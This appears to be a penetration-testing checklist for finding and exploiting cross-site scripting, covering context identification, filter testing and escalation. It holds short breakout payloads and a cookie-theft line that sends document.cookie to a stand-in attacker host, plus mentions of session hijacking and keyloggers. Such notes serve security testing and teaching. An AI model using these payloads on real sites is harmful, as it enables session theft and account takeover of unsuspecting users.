---
title: "Cross-Site Scripting (XSS)"
tags: [methodology, xss]
summary: "XSS discovery and exploitation — context identification, character filter testing, breakout payloads for HTML/attribute/JS contexts, cookie theft, and session hijacking."
draft: false
---

## 1. Discovery
- [ ] Map all parameters and input fields.
- [ ] Inject unique string (e.g., `MutekiXSS`).
- [ ] Check response to see if/where the string is reflected.
- [ ] Identify context (HTML body, attribute, JS variable).

## 2. Breakout & Exploitation
- [ ] Test which characters are filtered: `< > " ' ; / \`
- [ ] Based on context, craft breakout:
  - Inside tag: `"><script>alert(1)</script>`
  - Inside JS: `";alert(1);//`
- [ ] Test blind XSS payloads using Burp Collaborator or XSS Hunter.

## 3. Escalation
- [ ] Steal cookies (if no HttpOnly): `fetch('http://attacker.com/?c='+document.cookie)`
- [ ] Hijack session by performing actions on behalf of the user.
- [ ] Keylogger payload.
